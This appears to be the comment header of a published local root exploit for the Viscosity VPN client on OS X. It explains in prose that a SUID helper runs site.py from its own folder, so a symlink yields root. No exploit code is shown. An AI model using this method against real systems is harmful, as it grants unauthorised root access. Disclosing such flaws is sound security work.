# After the hullabaloo from the Tunnelblick local root, savy Mac users
# began defending Viscosity, another OS X VPN client. They figured, since
# they spent money on Viscosity, surely it would be better designed than
# the free open-source alternative.
#
# Unfortunately, this exploit took all of 2 minutes to find. DTrace for
# the win. Here, the SUID helper will execute site.py in its enclosing
# folder. A simple symlink, and we have root.
#
# greets to jono
